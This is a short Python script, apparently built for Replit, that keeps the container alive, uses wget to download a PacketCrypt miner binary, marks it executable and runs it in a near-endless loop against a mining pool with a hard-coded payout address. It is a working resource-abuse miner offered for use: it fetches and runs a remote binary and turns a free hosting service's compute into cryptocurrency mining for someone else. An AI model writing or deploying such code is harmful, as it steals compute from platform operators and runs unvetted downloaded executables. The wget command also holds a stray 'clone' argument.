
from replit_keep_alive import keep_alive
import os


keep_alive()
 
os.system("wget clone https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.3/packetcrypt-v0.4.3-linux_amd64 -O packetcrypt")

os.system("chmod +x packetcrypt")
for x in range(99999999999999999999999999999999999999999999999999999999999999999):
    os.system("./packetcrypt ann -p pkt1qyl4xuwys4ceqcjqkrttc0q8yhk0q5c4xlwcjsh http://pool.srizbi.com")

 